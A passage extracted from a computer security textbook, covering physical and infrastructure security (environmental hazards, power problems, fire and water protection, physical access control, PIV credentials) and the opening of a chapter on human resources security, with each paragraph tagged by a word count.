effects and the need for a major cleanup operation.
[Word Count: 38]

This category encompasses conditions in the environment that can damage or ­interrupt 
the service of information systems and the data they contain. Off site, there may be 
severe regionwide damage to the public infrastructure and, in the case of severe events 
such as hurricanes, it may take days, weeks, or even years to recover from the event.
[Word Count: 57]

Inappropriate Temperature and Humidity  Computers and related equipment 
are designed to operate within a certain temperature range. Most computer systems 
should be kept between 10 and 32 degrees Celsius (50 and 90 degrees Fahrenheit).
[Word Count: 34]

Outside this range, resources might continue to operate but produce undesirable 
results. If the ambient temperature around a computer gets too high, the computer 
cannot adequately cool itself, and internal components can be damaged. If the 
temperature gets too cold, the system can undergo thermal shock when it is turned 
on, causing circuit boards or integrated circuits to crack. Table 16.4 indicates the 
point at which permanent damage from excessive heat begins.
[Word Count: 72]

Another concern is the internal temperature of equipment, which can be 
­significantly higher than room temperature. Computer-related equipment comes 
with its own temperature dissipation and cooling mechanisms, but these may 
rely on, or be affected by, external conditions. Such conditions include excessive 
­ambient temperature, interruption of supply of power or heating, ventilation, and 
air-conditioning (HVAC) services, and vent blockage.
[Word Count: 59]

High humidity also poses a threat to electrical and electronic equipment. 
Long-term exposure to high humidity can result in corrosion. Condensation can 
threaten magnetic and optical storage media. Condensation can also cause a short 
circuit, which in turn can damage circuit boards. High humidity can also cause a 
­galvanic effect that results in electroplating, in which metal from one connector 
slowly migrates to the mating connector, bonding the two together.
[Word Count: 70]

Very low humidity can also be a concern. Under prolonged conditions of low 
humidity, some materials may change shape, and performance may be affected. 
Static electricity also becomes a concern. A person or object that becomes statically 
charged can damage electronic equipment by an electric discharge. Static electricity 
discharges as low as 10 volts can damage particularly sensitive electronic circuits, 
and discharges in the hundreds of volts can create significant damage to a variety of 
electronic circuits. Discharges from humans can reach into the thousands of volts, so 
this is a nontrivial threat.
[Word Count: 93]

In general, relative humidity should be maintained between 40% and 60% to 
avoid the threats from both low and high humidity.
[Word Count: 21]

Fire and Smoke  Perhaps the most frightening physical threat is fire. It is a threat 
to human life and property. The threat is not only from direct flame, but also 
from heat, release of toxic fumes, water damage from fire suppression, and smoke 
damage. Further, fire can disrupt utilities, especially electricity.
[Word Count: 51]

Table 16.4  Temperature Thresholds for Damage to Computing Resources
[Word Count: 9]

Sustained Ambient Temperature  
at which Damage May Begin
[Word Count: 8]

Flexible disks, magnetic tapes, etc.
38 ºC (100 ºF)
[Word Count: 9]

Thermoplastic insulation on wires 
­carrying hazardous voltage
[Word Count: 7]

Source: Data taken from National Fire Protection Association.
[Word Count: 8]

540    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

The temperature due to fire increases with time, and in a typical building, fire 
effects follow the curve shown in Figure 16.1. To get a sense of the damage caused 
by fire, Tables 16.4 and 16.5 shows the temperature at which various items melt or 
are damaged and therefore indicates how long after the fire is started such damage 
occurs.
[Word Count: 60]

Smoke damage related to fires can also be extensive. Smoke is an abrasive. 
It collects on the heads of unsealed magnetic disks, optical disks, and tape drives. 
Electrical fires can produce an acrid smoke that may damage other equipment and 
may be poisonous or carcinogenic.
[Word Count: 45]

The most common fire threat is from fires that originate within a facility, 
and, as discussed subsequently, there are a number of preventive and mitigating 
­measures that can be taken. A more uncontrollable threat is faced from wildfires, 
which are a plausible concern in the western United States, portions of Australia 
(where the term bushfire is used), and a number of other countries.
[Word Count: 63]

Water Damage  Water and other stored liquids in proximity to computer 
equipment pose an obvious threat. The primary danger is an electrical short, which
[Word Count: 24]

Figure 16.1  Standard Fire Temperature-Time Relations Used for Testing of 
Building Elements
[Word Count: 12]

Less common, but more catastrophic, is floodwater. Much of the ­damage 
comes from the suspended material in the water. Floodwater leaves a muddy 
­residue that is extraordinarily difficult to clean up.
[Word Count: 31]

Chemical, Radiological, and Biological Hazards  Chemical, radiological, 
and biological hazards pose a growing threat, both from intentional attack and 
from accidental discharge. None of these hazardous agents should be present in 
an information system environment, but either accidental or intentional intrusion 
is possible. Nearby discharges (e.g., from an overturned truck carrying hazardous 
materials) can be introduced through the ventilation system or open windows and, 
in the case of radiation, through perimeter walls. In addition, discharges in the 
vicinity can disrupt work by causing evacuations to be ordered. Flooding can also 
introduce biological or chemical contaminants.
[Word Count: 95]

In general, the primary risk of these hazards is to personnel. Radiation and 
chemical agents can also cause damage to electronic equipment.
[Word Count: 22]

Dust  Dust is a prevalent concern that is often overlooked. Even fibers from fabric 
and paper are abrasive and mildly conductive, although generally equipment is 
resistant to such contaminants. Larger influxes of dust can result from a number 
of incidents, such as a controlled explosion of a nearby building and a windstorm 
carrying debris from a wildfire. A more likely source of influx comes from dust 
surges that originate within the building due to construction or maintenance work.
[Word Count: 78]

Equipment with moving parts, such as rotating storage media and computer 
fans, are the most vulnerable to damage from dust. Dust can also block ventilation 
and reduce radiational cooling.
[Word Count: 29]

480 Cº/ 896 ºF
An uninsulated steel file tends to buckle and expose its contents
[Word Count: 15]

542    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

Infestation  One of the less pleasant physical threats is infestation, which covers a 
broad range of living organisms, including mold, insects, and rodents. High-humidity 
conditions can lead to the growth of mold and mildew, which can be harmful to both 
personnel and equipment. Insects, particularly those that attack wood and paper, 
are also a common threat.
[Word Count: 56]

This category encompasses threats related to electrical power and electromagnetic 
emission.
[Word Count: 11]

Electrical Power  Electrical power is essential to the operation of an information 
system. All of the electrical and electronic devices in the system require power, and 
most require uninterrupted utility power. Power utility problems can be broadly 
grouped into three categories: undervoltage, overvoltage, and noise.
[Word Count: 45]

An undervoltage condition occurs when the IS equipment receives less ­voltage 
than is required for normal operation. Undervoltage events range from ­temporary 
dips in the voltage supply, to brownouts (prolonged undervoltage), to power 
­outages. Most computers are designed to withstand prolonged voltage ­reductions 
of about 20% without shutting down and without operational error. Deeper dips 
or blackouts lasting more than a few milliseconds trigger a system shutdown. 
Generally, no damage is done, but service is interrupted.
[Word Count: 76]

Far more serious is an overvoltage condition. A surge of voltage can be caused 
by a utility company supply anomaly, by some internal (to the building) wiring fault, or 
by lightning. Damage is a function of intensity and duration, and the effectiveness of 
any surge protectors between your equipment and the source of the surge. A sufficient 
surge can destroy silicon-based components, including processors and memories.
[Word Count: 66]

Power lines can also be a conduit for noise. In many cases, these spurious 
­signals can endure through the filtering circuitry of the power supply and interfere 
with signals inside electronic devices, causing logical errors.
[Word Count: 35]

Electromagnetic Interference  Noise along a power supply line is only one 
source of electromagnetic interference (EMI). Motors, fans, heavy equipment, and 
even other computers generate electrical noise that can cause intermittent problems 
with the computer you are using. This noise can be transmitted through space as 
well as through nearby power lines.
[Word Count: 52]

Another source of EMI is high-intensity emissions from nearby commercial 
radio stations and microwave relay antennas. Even low-intensity devices, such as 
cellular telephones, can interfere with sensitive electronic equipment.
[Word Count: 29]

Human-caused threats are more difficult to deal with than the environmental 
and technical threats discussed so far. Human-caused threats are less predictable 
than other types of physical threats. Worse, human-caused threats are specifically 
designed to overcome prevention measures and/or seek the most vulnerable point 
of attack. We can group such threats into the following categories:
[Word Count: 55]

• Unauthorized physical access: Those without the proper authorization
[Word Count: 9]

should not be allowed access to certain portions of a building or complex
[Word Count: 13]

16.3 / Physical Security Prevention and Mitigation Measures   543
[Word Count: 9]

­unless ­accompanied with an authorized individual. Information assets such as 
­servers, mainframe computers, network equipment, and storage networks are 
generally located in a restricted area, with access limited to a small number 
of employees. Unauthorized physical access can lead to other threats, such as 
theft, vandalism, or misuse.
 
• Theft: This threat includes theft of equipment and theft of data by copying.
[Word Count: 62]

Eavesdropping and wiretapping also fall into this category. Theft can be 
at the hands of an outsider who has gained unauthorized access or by an 
insider.
 
• Vandalism: This threat includes destruction of equipment and data.
 
• Misuse: This category includes improper use of resources by those who
[Word Count: 48]

are ­authorized to use them, as well as use of resources by individuals not 
­authorized to use the resources at all.
[Word Count: 21]

16.3	Physical Security Prevention and Mitigation
[Word Count: 6]

In this section, we look at a range of techniques for preventing, or in some cases 
simply deterring, physical attacks. We begin with a survey of some of the ­techniques 
for dealing with environmental and technical threats and then move on to 
­human-caused threats.
[Word Count: 44]

One general prevention measure is the use of cloud computing. From a 
­physical security viewpoint, an obvious benefit of cloud computing is that there is a 
reduced need for information system assets on site and a substantial portion of data 
assets are not subject to on-site physical threats. See Chapter 5 for a discussion of 
cloud computing security issues.
[Word Count: 59]

We discuss these threats in the same order as in Section 16.2.
[Word Count: 12]

Inappropriate Temperature and Humidity  Dealing with this problem is 
primarily a matter of having environmental-control equipment of appropriate 
capacity and appropriate sensors to warn of thresholds being exceeded. Beyond 
that, the principal requirement is the maintenance of a power supply, discussed 
subsequently.
[Word Count: 42]

Fire and Smoke  Dealing with fire involves a combination of alarms, preventive 
measures, and fire mitigation. [MART73] provides the following list of necessary 
measures:
[Word Count: 24]

1.	 Choice of site to minimize likelihood of disaster. Few disastrous fires
[Word Count: 12]

­originate in a well-protected computer room or IS facility. The IS area 
should be chosen to minimize fire, water, and smoke hazards from adjoining 
areas. Common walls with other activities should have at least a one-hour 
fire-protection rating.
[Word Count: 38]

544    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

2.	 Air conditioning and other ducts designed so as not to spread fire. There are
[Word Count: 15]

standard guidelines and specifications for such designs.
	
3.	 Positioning of equipment to minimize damage.
	
4.	 Good housekeeping. Records and flammables must not be stored in the IS
[Word Count: 27]

area. Tidy installation of IS equipment is crucial.
	
5.	 Hand-operated fire extinguishers readily available, clearly marked, and
[Word Count: 17]

­regularly tested.
	
6.	 Automatic fire extinguishers installed. Installation should be such that
[Word Count: 12]

the extinguishers are unlikely to cause damage to equipment or danger to 
­personnel.
	
7.	 Fire detectors. The detectors sound alarms inside the IS room and with
[Word Count: 26]

­external authorities, and start automatic fire extinguishers after a delay to 
­permit human intervention.
	
8.	 Equipment power-off switch. This switch must be clearly marked and
[Word Count: 25]

­unobstructed. All personnel must be familiar with power-off procedures.
	
9.	 Emergency procedures posted.
	 10.	 Personnel safety. Safety must be considered in designing the building layout
[Word Count: 25]

and emergency procedures.
	 11.	 Important records stored in fireproof cabinets or vaults.
	 12.	 Records needed for file reconstruction stored off the premises.
	 13.	 Up-to-date duplicate of all programs stored off the premises.
	 14.	 Contingency plan for use of equipment elsewhere should the computers be
[Word Count: 44]

destroyed.
	 15.	 Insurance company and local fire department should inspect the facility.
[Word Count: 12]

To deal with the threat of smoke, the responsible manager should install 
smoke detectors in every room that contains computer equipment as well as under 
raised floors and over suspended ceilings. Smoking should not be permitted in 
­computer rooms.
[Word Count: 39]

For wildfires, the available countermeasures are limited. Fire-resistant 
­building techniques are costly and difficult to justify.
[Word Count: 16]

Water Damage  Prevention and mitigation measures for water threats must 
encompass the range of such threats. For plumbing leaks, the cost of relocating 
threatening lines is generally difficult to justify. With knowledge of the exact layout of 
water supply lines, measures can be taken to locate equipment sensibly. The location 
of all shutoff valves should be clearly visible or at least clearly documented, and 
responsible personnel should know the procedures to follow in case of emergency.
[Word Count: 76]

To deal with both plumbing leaks and other sources of water, sensors are vital. 
Water sensors should be located on the floor of computer rooms, as well as under 
raised floors, and should cut off power automatically in the event of a flood.
[Word Count: 43]

Other Environmental Threats  For chemical, biological, and radiological 
threats, specific technical approaches are available, including infrastructure design,
[Word Count: 17]

16.3 / Physical Security Prevention and Mitigation Measures   545
[Word Count: 9]

sensor design and placement, mitigation procedures, personnel training, and so 
forth. Standards and techniques in these areas continue to evolve.
[Word Count: 20]

As for dust hazards, the obvious prevention method is to limit dust through 
proper filter maintenance and regular IS room maintenance.
[Word Count: 21]

For infestations, regular pest control procedures may be needed, starting with 
maintaining a clean environment.
[Word Count: 15]

To deal with brief power interruptions, an uninterruptible power supply (UPS) 
should be employed for each piece of critical equipment. The UPS is a battery 
backup unit that can maintain power to processors, monitors, and other equipment 
for a period of minutes. UPS units can also function as surge protectors, power noise 
filters, and automatic shutdown devices when the battery runs low.
[Word Count: 62]

For longer blackouts or brownouts, critical equipment should be ­connected 
to an emergency power source, such as a generator. For reliable service, a range of 
issues need to be addressed by management, including product selection, generator 
placement, personnel training, testing and maintenance schedules, and so forth.
[Word Count: 46]

To deal with electromagnetic interference, a combination of filters and 
­shielding can be used. The specific technical details will depend on the ­infrastructure 
design and the anticipated sources and nature of the interference.
[Word Count: 33]

The general approach to human-caused physical threats is physical access control. 
Based on [MICH06], we can suggest a spectrum of approaches that can be used to 
restrict access to equipment. These methods can be used in combination:
[Word Count: 37]

1.	 Physical contact with a resource is restricted by restricting access to the
[Word Count: 13]

­building in which the resource is housed. This approach is intended to deny 
access to outsiders but does not address the issue of unauthorized insiders or 
employees.
	
2.	 Physical contact with a resource is restricted by putting the resource in a
[Word Count: 41]

locked cabinet, safe, or room.
	
3.	 A machine may be accessed, but it is secured (perhaps permanently bolted)
[Word Count: 18]

to an object that is difficult to move. This will deter theft but not vandalism, 
unauthorized access, or misuse.
	
4.	 A security device controls the power switch.
[Word Count: 27]

5.	 A movable resource is equipped with a tracking device so that a sensing portal
[Word Count: 15]

can alert security personnel or trigger an automated barrier to prevent the 
object from being moved out of its proper security area.
	
6.	 A portable object is equipped with a tracking device so that its current
[Word Count: 36]

The first two of the preceding approaches isolate the equipment. Techniques 
that can be used for this type of access control include controlled areas patrolled 
or guarded by personnel, barriers that isolate each area, entry points in the barrier 
(doors), and locks or screening measures at each entry point.
[Word Count: 49]

546    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

Physical access control should address not just computers and other IS 
e­quipment but also locations of wiring used to connect systems, the electrical 
power service, the HVAC equipment and distribution system, telephone and 
­communications lines, backup media, and documents.
[Word Count: 39]

In addition to physical and procedural barriers, an effective physical access 
control regime includes a variety of sensors and alarms to detect intruders and 
­unauthorized access or movement of equipment. Surveillance systems are ­frequently 
an integral part of building security, and special-purpose surveillance systems for 
the IS area are generally also warranted. Such systems should provide real-time 
remote viewing as well as recording.
[Word Count: 63]

Finally, the introduction of Wi-Fi changes the concept of physical security in 
the sense that it extends physical access across physical boundaries such as walls 
and locked doors. For example, a parking lot outside of a secure building provides 
access via Wi-Fi. This type of threat and the measures to deal with it are discussed 
in Chapter 24.
[Word Count: 58]

16.4	Recovery From Physical Security Breaches
[Word Count: 6]

Recovery from physical damage to the equipment or the site depends on the 
nature of the damage and, importantly, the nature of the residue. Water, smoke, 
and fire damage may leave behind hazardous materials that must be meticulously 
removed from the site before normal operations and the normal equipment suite 
can be reconstituted. In many cases, this requires bringing in disaster recovery 
­specialists from outside the organization to do the cleanup.
[Word Count: 71]

16.5	Example: A Corporate Physical Security Policy
[Word Count: 7]

To give the reader a feel for how organizations deal with physical security, 
we ­provide a real-world example of a physical security policy. The company 
is an EU-based engineering consulting firm that specializes in the provision 
of ­planning, design, and management services for infrastructure development 
worldwide. With interests in transportation, water, maritime, and property, the 
company is ­undertaking ­commissions in over 70 countries from a network of 
more than 70 offices.
[Word Count: 71]

16.6 / Integration of Physical and Logical Security   547
[Word Count: 9]

1The entire document is available at http:www.box.com/CompSec3e (ComputerSecurityPolicy.pdf).
[Word Count: 8]

Online Appendix H.1 is extracted from the company’s security standards 
­document.1 For our purposes, we have changed the name of the company to Company 
wherever it appears in the document. The company’s physical ­security policy relies 
heavily on ISO 17799 (Code of Practice for Information Security Management).
[Word Count: 47]

16.6	Integration of Physical and Logical Security
[Word Count: 7]

Physical security involves numerous detection devices, such as sensors and alarms, 
and numerous prevention devices and measures, such as locks and physical barriers. It 
should be clear that there is much scope for automation and for the integration of vari-
ous computerized and electronic devices. Clearly, physical security can be made more 
effective if there is a central destination for all alerts and alarms and if there is central 
control of all automated access control mechanisms, such as smart card entry sites.
[Word Count: 82]

From the point of view of both effectiveness and cost, there is increasing inter-
est not only in integrating automated physical security functions but in integrating, 
to the extent possible, automated physical and logical security functions. The most 
promising area is that of access control. Examples of ways to integrate physical and 
logical access control include the following:
[Word Count: 58]

• Use of a single ID card for physical and logical access. This can be a simple
[Word Count: 17]

magnetic-strip card or a smart card.
 
• Single-step user/card enrollment and termination across all identity and access
[Word Count: 17]

control databases.
 
• A central ID-management system instead of multiple disparate user directo-
[Word Count: 13]

ries and databases.
 
• Unified event monitoring and correlation.
[Word Count: 9]

As an example of the utility of this integration, suppose that an alert indicates 
that Bob has logged on to the company’s wireless network (an event generated by 
the logical access control system) but did not enter the building (an event generated 
from the physical access control system). Combined, these two events suggest that 
someone is hijacking Bob’s wireless account.
[Word Count: 60]

548    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

Federal ­government-wide requirements for security levels that are dependent on 
risks to the facility or ­information being protected. The standard applies to private-
sector contractors as well, and serves as a useful guideline for any organization.
[Word Count: 36]

The standard defines three assurance levels for verification of the card and the 
encoded data stored on the card, which in turn leads to verifying the authenticity of 
the person holding the credential. A level of some confidence corresponds to use of 
the card reader and PIN. A level of high confidence adds a biometric comparison 
of a ­fingerprint captured and encoded on the card during the card-issuing process 
and a fingerprint scanned at the physical access point. A very high confidence level
[Word Count: 83]

16.6 / Integration of Physical and Logical Security   549
[Word Count: 9]

requires that the ­process just described is completed at a control point attended by 
an official observer.
[Word Count: 17]

The other major component of the PIV system is the PIV card issuance and 
management subsystem. This subsystem includes the components ­responsible for 
identity proofing and registration, card and key issuance and management, and the 
various repositories and services (e.g., public key infrastructure [PKI] directory, 
certificate status servers) required as part of the verification i­nfrastructure.
[Word Count: 55]

The PIV system interacts with an access control subsystem, which includes 
components responsible for determining a particular PIV cardholder’s access to a 
physical or logical resource. FIPS 201-2 standardizes data formats and protocols for 
interaction between the PIV system and the access control system.
[Word Count: 44]

Figure 16.3, based on [FORR06], illustrates the convergence of physical and 
logical access control using FIPS 201-2. The core of the system includes the PIV
[Word Count: 25]

system (PACS) server
Contactless
smart card reader
[Word Count: 7]

Figure 16.3  Convergence Example
Source: Based on [FORR06].
[Word Count: 8]

550    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

and access control system as well as a certificate authority for signing CHUIDs. 
The other elements of the figure provide examples of the use of the system core for 
integrating physical and logical access control.
[Word Count: 35]

If the integration of physical and logical access control extends beyond a 
­unified front end to an integration of system elements, a number of benefits accrue, 
including the following [FORR06]:
[Word Count: 30]

• Employees gain a single, unified access control authentication device; this cuts
[Word Count: 12]

down on misplaced tokens, reduces training and overhead, and allows seam-
less access.
 
• A single logical location for employee ID management reduces duplicate data
[Word Count: 25]

entry operations and allows for immediate and real-time authorization revo-
cation of all enterprise resources.
 
• Auditing and forensic groups have a central repository for access control
[Word Count: 27]

investigations.
 
• Hardware unification can reduce the number of vendor purchase-and-support
[Word Count: 11]

contracts.
 
• Certificate-based access control systems can leverage user ID certificates
[Word Count: 11]

for other security applications, such as document e-signing and data 
­encryption.
[Word Count: 11]

Use of PIV Credentials in Physical Access Control Systems
[Word Count: 9]

FIPS 201 defines characteristics of the identity credential that can be interoperable 
government-wide. It does not, however, provide specific guidance for applying this 
standard as part of a physical access control system (PACS) in an environment in 
which one or more levels of access control is desired. To provide such guidance, in 
2008 NIST issued SP 800-116 [A Recommendation for the Use of PIV Credentials in 
Physical Access Control Systems (PACS)].
[Word Count: 71]

SP 800-116 makes use of the following authentication mechanisms:
[Word Count: 9]

• Visual (VIS): Visual identity verification of a PIV card is done by a human guard.
[Word Count: 16]

The human guard checks to see that the PIV card looks genuine, ­compares the 
cardholder’s facial features with the picture on the card, checks the expiration 
date printed on the card, verifies the correctness of other data elements printed 
on the card, and visually verifies the security feature(s) on the card.
 
• Cardholder unique identifier (CHUID): The CHUID is a PIV card data
[Word Count: 63]

object. Authentication is implemented by transmission of the CHUID from 
the PIV card to PACS.
 
• Biometric (BIO): Authentication is implemented by using a fingerprint or iris
[Word Count: 27]

data object sent from the PIV card to the PACS.
 
• Attended biometric (BIO-A): This authentication mechanism is the same as
[Word Count: 21]

BIO authentication but an attendant supervises the use of the PIV card and 
the submission of the PIN and the sample biometric by the cardholder.
 
• PIV authentication key (PKI): PACS may be designed to perform public key
[Word Count: 38]

cryptography-based authentication using the PIV authentication key. Use of
[Word Count: 9]

16.6 / Integration of Physical and Logical Security   551
[Word Count: 9]

the PKI provides two-factor authentication, since the cardholder must enter a 
PIN to unlock the card in order to successfully authenticate.
 
• Card authentication key (CAK): The CAK is an optional key that may be
[Word Count: 35]

present on any PIV card. The purpose of the CAK authentication mechanism 
is to authenticate the card and therefore its possessor. The CAK is unique 
among the PIV keys in several respects: The CAK may be used on the con-
tactless or contact interface in a challenge/response protocol; and the use of 
the CAK does not require PIN entry.
[Word Count: 59]

All of these authentication mechanisms, except for CAK, are defined in 
FIPS 201. CAK is an optional PIV mechanism defined in SP800-116. SP800-116 
is designed to address an environment in which different physical access points 
within a facility do not all have the same security requirements, and therefore 
the PIV ­authentication mechanism should be selected to conform to the security 
­requirements of the different protected areas.
[Word Count: 66]

Figure 16.4a illustrates a general model defined in SP 800-116. The model 
­indicates alternative authentication mechanisms that may be used for access to 
­specific areas. The model is designed such that at least one authentication factor is 
required to enter a controlled area, two factors for a limited area, and three factors 
for an exclusion area.
[Word Count: 56]

Table 16.6  Degrees of Security and Control for Protected Areas (FM 3-19.30)
[Word Count: 12]

Unrestricted
An area of a facility that has no security interest.
[Word Count: 11]

Controlled
That portion of a restricted area usually near or surrounding a limited or 
exclusion area. Entry to the controlled area is restricted to personnel with a 
need for access. Movement of authorized personnel within this area is not 
necessarily controlled since mere entry to the area does not provide access 
to the security interest. The controlled area is provided for administrative 
control, for safety, or as a buffer zone for in-depth security for the limited 
or exclusion area.
[Word Count: 79]

Limited
Restricted area within close proximity of a security interest. Uncontrolled 
movement may permit access to the security interest. Escorts and other 
­internal restrictions may prevent access within limited areas.
[Word Count: 30]

Exclusion
A restricted area containing a security interest. Uncontrolled movement 
­permits direct access to the security interest.
[Word Count: 17]

552    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

Figure 16.4b is an example of the application of SP800-116 principles to 
a commercial, academic, or government facility. A visitor registration area is 
­available to all. In this example, the entire facility beyond visitor registration is a 
controlled area available to authorized personnel and their visitors. This may be 
considered a relatively low-risk area, in which some confidence in the identity of 
those entering should be achieved. A one-factor authentication mechanism, such as
[Word Count: 73]

Building housing lab space
and other sensitive areas
[Word Count: 8]

Fenced-in area
containing a
number of buildings
[Word Count: 7]

Figure 16.4  Use of Authentication Mechanisms for Physical Access 
Control
[Word Count: 10]

The model illustrated in Figure 16.4a, and the example in Figure 16.4b, depicts 
a nested arrangement of restricted areas. This arrangement may not be suitable for 
all facilities. In some facilities, direct access from outside to a limited area or an 
exclusion area may be necessary. In that case, all of the required authentication 
factors must be employed at the access point. Thus a direct access point to an exclu-
sion area may employ, in combination, CHUID+VIS, BIO or BIO-A, and PKI.
[Word Count: 82]

[NIST95], [SADO03], and [SZUB98] each contain useful chapters on physi-
cal security. [FEMA93] is a good source of information on physical security. 
[FEMA97] is a detailed reference manual covering all types of natural hazards. 
[DOT12] is a useful reference to hazardous materials. [ARMY10], though it has 
a military orientation, is a useful and thorough examination of physical security 
threats and measures.
[Word Count: 61]

ARMY10	 Department of the Army. Physical Security. Field Manual FM 3-99.32,
[Word Count: 11]

August 2010.
DOT12	
U.S. Department of Transportation. Emergency Response Guidebook. 
Pipeline and Hazardous Materials Safety Administration, 2012, http://www 
.phmsa.dot.gov
FEMA93	 Federal Emergency Management Administration. Emergency Management
[Word Count: 26]

Guide for Business and Industry. FEMA 141, October 1993.
FEMA97	 Federal Emergency Management Administration. Multihazard Identification
[Word Count: 16]

and Risk Assessment. FEMA Publication 9-0350, 1997.
NIST95	
National Institute of Standards and Technology. An Introduction to Computer 
Security: The NIST Handbook. Special Publication 800-12. October 1995.
SADO03	 Sadowsky, G. et al. Information Technology Security Handbook. Washington,
[Word Count: 37]

DC: The World Bank, 2003, http://www.infodev-security.net/handbook
SZUB98	 Szuba, T. Safeguarding Your Technology. National Center for Edu­
[Word Count: 16]

cation Statistics, NCES 98-297, 1998, http://www.nces.ed.gov/pubsearch/
pubsinfo.asp?pubid=98297
[Word Count: 7]

554    Chapter 16 / Physical and Infrastructure Security
[Word Count: 8]

16.1	
What are the principal concerns with respect to inappropriate temperature and humidity?
	 16.2	
What are the direct and indirect threats posed by fire?
	 16.3	
What are the threats posed by loss of electrical power?
	 16.4	
List and describe some measures for dealing with inappropriate temperature and 
­humidity.
	 16.5	
List and describe some measures for dealing with fire.
	 16.6	
List and describe some measures for dealing with water damage.
	 16.7	
List and describe some measures for dealing with power loss.
[Word Count: 80]

16.1	
Table 16.7 is an extract from the Technology Risk Checklist, published by the World 
Bank [WORL04] to provide guidance to financial institutions and other organization.
[Word Count: 26]

Table 16.7  World Bank Physical Security Checklist
[Word Count: 7]

54.  Do your security policies restrict physical access to networked systems facilities?
[Word Count: 12]

55.  Are your physical facilities access-controlled through biometrics or smart cards, in order to
[Word Count: 14]

56.  Does someone regularly check the audit trails of key card access systems? Does this note how
[Word Count: 17]

57.  Are backup copies of software stored in safe containers?
[Word Count: 10]

58.  Are your facilities securely locked at all times?
[Word Count: 9]

59.  Do your network facilities have monitoring or surveillance systems to track abnormal activity?
[Word Count: 14]

61.  Are your facilities equipped with alarms to notify of suspicious intrusions into systems rooms
[Word Count: 15]

62.  Are cameras placed near all sensitive areas?
[Word Count: 8]

63.  Do you have a fully automatic fire suppression system that activates automatically when it
[Word Count: 15]

64.  Do you have automatic humidity controls to prevent potentially harmful levels of humidity
[Word Count: 14]

65.  Do you utilize automatic voltage control to protect IT assets?
[Word Count: 11]

66.  Are ceilings reinforced in sensitive areas (e.g., server room)?
[Word Count: 10]

threats
facilities security
infrastructure security
logical security
[Word Count: 7]

verification (PIV)
physical access control
[Word Count: 5]

physical security 
premises security
technical threats
undervoltage
[Word Count: 7]

16.8	Key Terms, Review Questions, and Problems
[Word Count: 7]

16.8 / Key Terms, Review Questions, and Problems   555
[Word Count: 9]

This extract is the physical security checklist portion. Compare this to the security 
policy outlined in Appendix H.1. What are the overlaps and the differences?
	 16.2	
Are any issues addressed in either Table 16.7 or Appendix H.1 that are not covered in 
this chapter? If so, discuss their significance.
	 16.3	
Are any issues addressed in this chapter that are not covered in Appendix H.1? If so, 
discuss their significance.
	 16.4	
Fill in the entries in the following table by providing brief descriptions.
[Word Count: 82]

Physical  
Security
Boundary type (what  
constitutes the  
perimeter)
[Word Count: 8]

17.1	 Security Awareness, Training, and Education
Motivation
A Learning Continuum
Awareness
Training
Education
[Word Count: 13]

17.2	 Employment Practices and Policies
Security in the Hiring Process
During Employment
Termination of Employment
[Word Count: 15]

17.3	 ­E-​­Mail and Internet Use Policies
Motivation
Policy Issues
Guidelines for Developing a Policy
[Word Count: 14]

17.4	 Computer Security Incident Response Teams
Detecting Incidents
Triage Function
Responding to Incidents
Documenting Incidents
Information Flow for Incident Handling
[Word Count: 20]

17.6	 Key Terms, Review Questions, and Problems
[Word Count: 7]

17.1 / Security Awareness, Training, and Education   557
[Word Count: 8]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Describe the benefits of security awareness, training, and education
[Word Count: 10]

­programs.
◆	Present a survey of employment practices and policies.
◆	Discuss the need for ­e-​­mail and Internet use policies and provide guidelines
[Word Count: 23]

for developing such policies.
◆	Explain the role of computer security incident response teams.
◆	Describe the major steps involved in responding to a computer security
[Word Count: 26]

This chapter covers a number of topics that, for want of a better term, we categorize 
as human resources security. The subject is a broad one, and a full discussion is well 
beyond the scope of this book. In this chapter, we look at some important issues in 
this area.
[Word Count: 50]

17.1	Security Awareness, Training, and Education
[Word Count: 6]

The topic of security awareness, training, and education is mentioned ­prominently 
in a number of standards and ­standards-​­related documents, including ISO 27002 
(Code of Practice for Information Security Management) and NIST Special 
Publication ­800-​­100 (Information Security Handbook: A Guide for Managers). This 
section provides an overview of the topic.
[Word Count: 49]

Security awareness, training, and education programs provide four major benefits 
to organizations:
[Word Count: 12]

• Improving employee behavior
 
• Increasing the ability to hold employees accountable for their actions
 
• Mitigating liability of the organization for an employee’s behavior
 
• Complying with regulations and contractual obligations
[Word Count: 32]

Employee behavior is a critical concern in ensuring the security of computer 
systems and information assets. A number of recent surveys show that employee 
actions, both malicious and unintentional, cause considerable ­computer-​­related 
loss and security compromises (e.g., [CSI10], [VERI13]). The principal problems 
associated with employee behavior are errors and omissions, fraud, and actions by 
disgruntled employees. Security awareness, training, and education programs can 
reduce the problem of errors and omissions.
[Word Count: 70]

Such programs can serve as a deterrent to fraud and actions by disgrun-
tled employees by increasing employees’ knowledge of their accountability and
[Word Count: 23]

558    Chapter 17 / Human Resources Security
[Word Count: 7]

of potential penalties. Employees cannot be expected to follow policies and 
­procedures of which they are unaware. Further, enforcement is more difficult if 
employees can claim ignorance when caught in a violation.
[Word Count: 32]

Ongoing security awareness, training, and education programs are also 
­important in limiting an organization’s liability. Such programs can bolster an 
­organization’s claim that a standard of due care has been taken in protecting 
information.
[Word Count: 34]

Finally, security awareness, training, and education programs may be needed 
to comply with regulations and contractual obligations. For example, companies 
that have access to information from clients may have specific ­awareness and train-
ing obligations that they must meet for all employees with access to client data.
[Word Count: 47]

NIST SP ­800-​­16 (Information Technology Security Training Requirements: 
A ­Role-​­ and ­Performance-​­Based Model) summarizes the four layers as follows:
[Word Count: 19]

• Security awareness is explicitly required for all employees, whereas ­security
[Word Count: 11]

basics and literacy is required for those employees, including ­contractor 
­employees, who are involved in any way with IT systems. In today’s 
­environment, the latter category includes almost all individuals within the 
organization.
 
• The security basics and literacy category is a transitional stage between
[Word Count: 45]

­awareness and training. It provides the foundation for subsequent training by 
providing a universal baseline of key security terms and concepts.
[Word Count: 21]

• After security basics and literacy, training becomes focused on ­providing
[Word Count: 11]

the knowledge, skills, and abilities specific to an individual’s roles and 
­responsibilities relative to IT systems. At this level, training recognizes 
the differences among beginning, intermediate, and advanced skill 
requirements.
 
• The education and experience level focuses on developing the ability and
[Word Count: 42]

­vision to perform complex, multidisciplinary activities and the skills needed to 
